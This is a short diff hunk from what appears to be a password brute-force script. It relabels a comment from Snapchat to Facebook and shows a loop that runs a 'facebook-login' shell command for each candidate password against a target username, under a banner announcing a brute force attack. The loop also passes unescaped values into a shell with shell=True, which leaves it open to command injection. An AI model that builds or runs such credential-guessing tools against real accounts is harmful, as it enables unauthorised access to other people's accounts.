@@ -23,7 +23,7 @@ print(Fore.YELLOW + f"Starting brute force attack on {username}..." + Style.RESE
 start_time = time.time()
 
 for password in passwords:
-    # Construct Snapchat login command
+    # Construct Facebook login command
     command = f"facebook-login -u {username} -p {password}"
     process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     output, error = process.communicate()
